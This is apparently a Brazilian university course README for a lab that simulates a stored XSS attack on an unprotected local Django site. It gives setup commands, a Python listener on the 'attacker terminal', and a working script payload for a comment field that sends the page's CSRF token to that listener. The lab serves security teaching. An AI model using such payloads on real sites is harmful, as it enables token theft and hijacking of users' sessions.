# PCS3544
Segurança da Informação (2023)

Escola Politécnica da USP

Alunos:
* Gustavo Freitas de Sá Oliveira - 11261062
* Roberta Boaventura Andrade - 11260832

Simulação de um ataque XSS a um site sem proteção

### Utilização

* Terminal da aplicação
```properties
pip install django

cd ./web
python manage.py makemigrations
python manage.py migrate
python manage.py runserver
```

* Terminal do atacante
```properties
python -m http.server 80
```

* Código malicioso a ser inserido no campo de comentário:

```html
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js" integrity="sha512-3gJwYpMe3QewGELv8k/BX9vcqhryRdzRMxVfq6ngyWXwo03GFEzjsUm8Q7RZcHPHksttq7/GFoxjCVUjkjvPdw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>

    <script>
        $.ajax({
            url: "http://localhost:80",
            method: 'GET',
            data: {
                'csrfmiddlewaretoken': document.getElementsByName('csrfmiddlewaretoken')[0].value
            }
        });
    </script>
```